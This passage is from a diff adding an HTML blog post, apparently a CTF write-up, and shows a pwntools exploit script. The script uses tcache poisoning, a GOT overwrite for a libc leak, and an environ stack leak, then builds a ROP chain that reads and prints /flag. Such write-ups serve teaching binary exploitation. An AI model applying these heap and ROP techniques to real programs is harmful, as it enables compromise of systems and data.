+                        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x21</span>) <span style="color:#6272a4"># fake size</span>
+                    ]))
+    free(<span style="color:#bd93f9">4</span>) <span style="color:#6272a4"># count for 0x40 tcachebin = 1</span>
+
+    <span style="color:#6272a4"># chunk2 =&gt; sz extended</span>
+    edit(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;K&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x20</span>)
+    <span style="color:#6272a4"># chunk2 =&gt; tcachebin 0x40, count = 2</span>
+    free(<span style="color:#bd93f9">2</span>)
+
+    <span style="color:#6272a4"># oob write over chunk3, we keep valid header</span>
+    add(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join([   pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span>,
+                        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x41</span>) <span style="color:#6272a4"># valid size to end up in the 0x40 tcache bin</span>
+                    ])) <span style="color:#6272a4"># count = 1</span>
+
+    <span style="color:#6272a4"># chunk3 =&gt; 0x40 tcachebin, count = 2</span>
+    free(<span style="color:#bd93f9">3</span>)
+
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Encrypted fp: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(encode_ptr(heap_leak, CHUNK3_OFFT, exe<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>printf))<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+    <span style="color:#6272a4"># tcache poisoning</span>
+    edit(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join([   pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span>,
+                         pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x41</span>), <span style="color:#6272a4"># valid size</span>
+                         pwn<span style="color:#ff79c6">.</span>p64(encode_ptr(heap_leak, CHUNK3_OFFT, exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>books)) <span style="color:#6272a4"># forward ptr</span>
+                     ]))
+
+    <span style="color:#6272a4"># dumb</span>
+    add(<span style="color:#bd93f9">3</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x20</span>) <span style="color:#6272a4"># count = 1</span>
+
+    <span style="color:#6272a4"># arbitrary write to @books, this way books[1] is user controlled</span>
+    add(<span style="color:#bd93f9">4</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join([
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x1000</span>), <span style="color:#6272a4"># sz</span>
+        pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>books), <span style="color:#6272a4"># target</span>
+        <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;P&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x10</span>
+    ])) <span style="color:#6272a4"># count = 0</span>
+
+    <span style="color:#6272a4"># we can write way more due to the previous call</span>
+    edit(<span style="color:#bd93f9">1</span>, pwn<span style="color:#ff79c6">.</span>flat([
+            <span style="color:#6272a4"># 1==</span>
+            <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>stdout, <span style="color:#6272a4"># target</span>
+            <span style="color:#6272a4"># 2==</span>
+            <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>free, <span style="color:#6272a4"># target</span>
+            <span style="color:#6272a4"># 3==</span>
+            <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>secret_msg, <span style="color:#6272a4"># target</span>
+            <span style="color:#6272a4"># 4==</span>
+            <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+            exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>books <span style="color:#6272a4"># target</span>
+        ] <span style="color:#ff79c6">+</span> [<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x60</span>, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+    
+    <span style="color:#6272a4"># free@got =&gt; puts</span>
+    edit(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join([
+            pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>puts)
+        ]))
+    
+    <span style="color:#6272a4"># can print = true</span>
+    enable_print(<span style="color:#bd93f9">3</span>)
+
+    <span style="color:#6272a4"># libc leak</span>
+    libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> libc_leak_free(<span style="color:#bd93f9">1</span>)
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+    <span style="color:#6272a4"># leak stack (environ)</span>
+    edit(<span style="color:#bd93f9">4</span>, pwn<span style="color:#ff79c6">.</span>flat([
+            <span style="color:#6272a4"># 1==</span>
+            <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+            libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#6272a4"># target</span>
+        ], filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+    environ <span style="color:#ff79c6">=</span> leak_environ(<span style="color:#bd93f9">1</span>)
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;environ: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(environ)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+    stackframe_rewrite <span style="color:#ff79c6">=</span> environ <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x150</span>
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stackframe_rewrite: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stackframe_rewrite)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+    rop <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ROP(libc, base<span style="color:#ff79c6">=</span>stackframe_rewrite)
+
+    <span style="color:#6272a4"># setup the write to the rewrite stackframe</span>
+    edit(<span style="color:#bd93f9">4</span>, pwn<span style="color:#ff79c6">.</span>flat([
+            <span style="color:#6272a4"># 1==</span>
+            <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+            stackframe_rewrite <span style="color:#6272a4"># target</span>
+        ], filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+    <span style="color:#6272a4"># ROPchain</span>
+    rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_open, rdi<span style="color:#ff79c6">=</span>stackframe_rewrite <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xde</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>, rsi<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>O_RDONLY) <span style="color:#6272a4"># open</span>
+    rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
+    rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_read, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>, rsi<span style="color:#ff79c6">=</span>heap_leak, rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># file descriptor bf ...</span>
+    rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
+
+    rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_write, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>, rsi<span style="color:#ff79c6">=</span>heap_leak, rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># write</span>
+    rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
+    rop<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0x1337</span>)
+    rop<span style="color:#ff79c6">.</span>raw(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/flag</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+
+    <span style="color:#8be9fd;font-style:italic">print</span>(rop<span style="color:#ff79c6">.</span>dump())
+    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">len</span>(rop<span style="color:#ff79c6">.</span>chain()) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>))
+
+    <span style="color:#6272a4"># write and trigger the ROPchain</span>
+    edit(<span style="color:#bd93f9">1</span>, rop<span style="color:#ff79c6">.</span>chain())
+    
+    io<span style="color:#ff79c6">.</span>interactive()
+
+<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+    exp()
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
